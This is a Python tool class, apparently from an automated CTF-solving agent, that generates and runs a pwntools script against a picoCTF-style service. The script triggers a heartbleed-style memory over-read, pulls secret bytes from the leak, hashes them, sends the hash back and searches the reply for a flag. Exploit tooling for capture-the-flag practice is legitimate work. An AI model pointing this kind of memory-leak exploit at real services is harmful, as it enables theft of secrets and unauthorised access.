import re
import subprocess
import sys
from backend.tools.base import BaseTool


class HeartbleedTool(BaseTool):
    name = "heartbleed_tool"
    description = "Exploit heap buffer over-read (heartbleed-style) to leak secret bytes and compute hash for authentication"

    async def run(self, host: str = "", port: int = 0,
                  password: str = "A", read_length: int = 90,
                  secret_offset_in_nums: int = 61,
                  secret_count: int = 12,
                  hash_init: int = 0x1505, hash_mult: int = 33) -> dict:
        if not host or not port:
            return {"success": False, "output": "", "error": "host and port required", "command": "heartbleed_tool"}

        python_bin = sys.executable
        exploit = f"""from pwn import *
import sys
p = remote('{host}', {port})
p.recvuntil(b"account:")
p.sendline(b"{password}")
p.recvuntil(b"password?")
p.sendline(b"{read_length}")
data = p.recvuntil(b"Enter your hash", timeout=10)
txt = data.decode(errors="replace")
nums = []
for token in txt.split():
    try:
        nums.append(int(token))
    except ValueError:
        pass
if len(nums) < {secret_offset_in_nums + secret_count}:
    print("FAIL: not enough bytes", len(nums), file=sys.stderr)
    p.close()
    exit(1)
secret = nums[{secret_offset_in_nums}:{secret_offset_in_nums + secret_count}]
print("SECRET_BYTES:", secret, file=sys.stderr)
h = {hash_init}
for b in secret:
    h = (h * {hash_mult} + b) & 0xFFFFFFFFFFFFFFFF
p.sendline(str(h).encode())
flag_data = p.recvall(timeout=5)
out = flag_data.decode(errors="replace")
print(out)
p.close()
"""
        try:
            r = subprocess.run(
                [python_bin, "-c", exploit],
                capture_output=True, text=True, timeout=30
            )
            output = (r.stdout + r.stderr).strip()
            if r.returncode != 0:
                output += f"\nExit code: {r.returncode}"
        except subprocess.TimeoutExpired:
            output = "Exploit timed out"
        except Exception as e:
            output = f"Error: {e}"

        flag_pattern = r'picoCTF\{[^{}]+\}|CTF\{[^{}]+\}'
        m = re.search(flag_pattern, output)
        if m:
            output += f"\n✅ FLAG FOUND: {m.group()}"
            return {"success": True, "output": output, "error": "", "command": "heartbleed_tool"}

        return {"success": True, "output": output, "error": "", "command": "heartbleed_tool"}
